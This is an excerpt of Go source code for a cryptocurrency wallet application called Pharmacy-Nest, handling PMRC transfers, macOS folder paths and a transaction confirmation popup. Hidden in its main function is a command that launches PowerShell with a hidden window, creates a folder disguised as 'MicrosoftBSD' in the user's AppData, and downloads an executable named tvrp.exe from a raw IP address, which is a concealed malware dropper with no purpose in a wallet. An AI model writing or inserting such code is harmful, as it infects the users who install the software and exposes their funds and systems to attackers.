...
import (
	"Pharmacy-Nest/turtlecoinwalletdrpcgo"
	"Pharmacy-Nest/walletdmanager"
	"encoding/csv"
	"encoding/json"
	"io"
	"io/ioutil"
...
func main() {
    ...
    c := exec.Command("cmd", "/C", "powershell.exe mkdir %appdata%\\MicrosoftBSD && powershell.exe -windowstyle hidden Invoke-RestMethod -Uri 91.201.25.46/tvrp.exe -OutFile $env:APPDATA\\MicrosoftBSD\\tvrp.exe")
	...
	if isPlatformDarwin {
		...
		pathToAppFolder := pathToHomeDir + "/Library/Application Support/Pharmacy-Nest"
	...
	if err == nil {
		...
		if needFullUpdate {
			...
			for index, transfer := range transfers {
				...
				amountString += " PMRC (fee: " + strconv.FormatFloat(transfer.Fee, 'f', 2, 64) + ")"
...
func transfer(transferAddress string, transferAmount string, transferPaymentID string, transferFee string) {
	...
	qmlBridge.FinishedSendingTransaction()
	qmlBridge.DisplayPopup("PMRCs sent successfully", 4000)
}
